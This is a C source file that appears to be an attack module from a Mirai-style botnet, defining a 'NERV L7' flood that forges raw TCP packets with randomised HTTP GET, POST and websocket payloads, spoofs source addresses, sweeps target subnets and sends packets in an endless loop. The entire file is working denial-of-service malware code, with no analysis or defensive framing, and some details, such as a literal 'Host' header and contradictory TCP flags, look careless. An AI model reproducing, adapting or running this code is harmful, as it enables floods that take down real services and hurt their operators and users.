#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <errno.h>
#include <time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

void attack_nerv_l7(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQ, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, 0);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    char *http_path = attack_get_opt_str(opts_len, opts, ATK_OPT_HTTP_PATH, "/");
    char *useragent = attack_get_opt_str(opts_len, opts, ATK_OPT_USERAGENT, "Mozilla/5.0");
    char *cookies = attack_get_opt_str(opts_len, opts, ATK_OPT_COOKIES, "");

    char nerv_payload[1510];
    int payload_type = 0;
    int payload_len = 0;

    payload_type = rand_next() % 3;

    switch (payload_type)
    {
        case 0:
        {
            payload_len = util_strlen("GET ") + util_strlen(http_path) + util_strlen(" HTTP/1.1\r\nHost: ") + util_strlen("Host") + util_strlen("\r\nUser-Agent: ") + util_strlen(useragent) + util_strlen("\r\nAccept: text/html,application/xhtml+xml\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n");
            if (util_strlen(cookies) > 0)
                payload_len += util_strlen("Cookie: ") + util_strlen(cookies) + util_strlen("\r\n");
            payload_len += util_strlen("\r\n");
            if (payload_len > 1510) payload_len = 1510;

            util_strcpy(nerv_payload, "GET ");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), http_path);
            util_strcpy(nerv_payload + util_strlen(nerv_payload), " HTTP/1.1\r\nHost: ");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "Host");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "\r\nUser-Agent: ");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), useragent);
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "\r\nAccept: text/html,application/xhtml+xml\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n");
            if (util_strlen(cookies) > 0)
            {
                util_strcpy(nerv_payload + util_strlen(nerv_payload), "Cookie: ");
                util_strcpy(nerv_payload + util_strlen(nerv_payload), cookies);
                util_strcpy(nerv_payload + util_strlen(nerv_payload), "\r\n");
            }
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "\r\n");
            break;
        }
        case 1:
        {
            int post_len = (rand_next() % 512) + 64;
            payload_len = util_strlen("POST ") + util_strlen(http_path) + util_strlen(" HTTP/1.1\r\nHost: ") + util_strlen("Host") + util_strlen("\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ");
            char len_str[16];
            sprintf(len_str, "%d", post_len);
            payload_len += util_strlen(len_str);
            payload_len += util_strlen("\r\nConnection: close\r\n\r\n");
            payload_len += post_len;
            if (payload_len > 1510) payload_len = 1510;

            util_strcpy(nerv_payload, "POST ");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), http_path);
            util_strcpy(nerv_payload + util_strlen(nerv_payload), " HTTP/1.1\r\nHost: ");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "Host");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ");
            sprintf(len_str, "%d", post_len);
            util_strcpy(nerv_payload + util_strlen(nerv_payload), len_str);
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "\r\nConnection: close\r\n\r\n");
            int pos = util_strlen(nerv_payload);
            for (int j = 0; j < post_len && pos < 1510; j++, pos++)
                nerv_payload[pos] = rand_next() & 0xff;
            break;
        }
        default:
        {
            payload_len = util_strlen("GET ") + util_strlen(http_path) + util_strlen(" HTTP/1.1\r\nHost: ") + util_strlen("Host") + util_strlen("\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ") + util_strlen("dGhlIHNhbXBsZSBub25jZQ==") + util_strlen("\r\nSec-WebSocket-Version: 13\r\n\r\n");
            if (payload_len > 1510) payload_len = 1510;

            util_strcpy(nerv_payload, "GET ");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), http_path);
            util_strcpy(nerv_payload + util_strlen(nerv_payload), " HTTP/1.1\r\nHost: ");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "Host");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "dGhlIHNhbXBsZSBub25jZQ==");
            util_strcpy(nerv_payload + util_strlen(nerv_payload), "\r\nSec-WebSocket-Version: 13\r\n\r\n");
            break;
        }
    }

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting NERV L7 attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *data;

        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        data = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(seq);
        tcph->ack = htonl(ack);
        tcph->doff = 5;
        tcph->psh = 1;
        tcph->ack_seq = 1;
        tcph->syn = 1;
        tcph->window = rand_next() & 0xffff;

        util_memcpy(data, nerv_payload, payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                tcph->source = rand_next();
            if (dport == 0xffff)
                tcph->dest = rand_next();

            if (seq == 0xffff)
                tcph->seq = rand_next();

            payload_type = rand_next() % 3;
            if (payload_type == 0)
            {
                util_strcpy(data, "GET ");
                util_strcpy(data + util_strlen(data), http_path);
                util_strcpy(data + util_strlen(data), " HTTP/1.1\r\nHost: ");
                util_strcpy(data + util_strlen(data), "Host");
                util_strcpy(data + util_strlen(data), "\r\nUser-Agent: ");
                util_strcpy(data + util_strlen(data), useragent);
                util_strcpy(data + util_strlen(data), "\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n");
            }

            tcph->check = 0;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + payload_len), sizeof(struct tcphdr) + payload_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}
